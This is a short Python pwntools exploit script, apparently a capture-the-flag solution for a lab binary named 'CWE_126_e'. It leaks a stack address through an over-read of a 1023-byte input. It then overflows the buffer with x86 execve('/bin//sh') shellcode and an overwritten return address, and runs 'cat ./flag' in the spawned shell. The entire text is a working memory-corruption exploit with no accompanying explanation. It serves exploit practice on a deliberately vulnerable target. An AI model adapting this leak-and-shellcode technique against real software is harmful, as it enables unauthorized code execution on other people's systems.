from pwn import *

context.log_level='debug'

s=process('./CWE_126_e')

#shellcode
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode+="\x68\x68\x2f\x62\x69\x6e\x89"
shellcode+="\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode+="\xcd\x80\x31\xc0\x40\xcd\x80"


raw_input('leak start')

s.sendline("1")

print s.recv(1024)
s.sendline('1')
s.sendline('1')
s.sendline('1')
s.sendline('1')

#Input motivation => buffer Overflow
s.sendline('A'*1023)

s.recvuntil('A'*1023+'\n')

#We can stack addr(ebp) leak
stack=u32(s.recv(4))

print hex(stack)

shell_addr=stack-0x40c

print s.recv(1024)
raw_input('exploit start')
#Use stack addr => exploit

s.sendline("1")

print s.recv(1024)
s.sendline('1')
s.sendline('1')
s.sendline('1')
s.sendline('1')

#Input motivation => shellcode+dummy+ret(control)
s.sendline(shellcode+'A'*(1028-len(shellcode))+p32(shell_addr))

sleep(0.5)

s.sendline('cat ./flag')

s.recv(1024)
s.recv(1024)

print "flag: "+s.recv(1024)

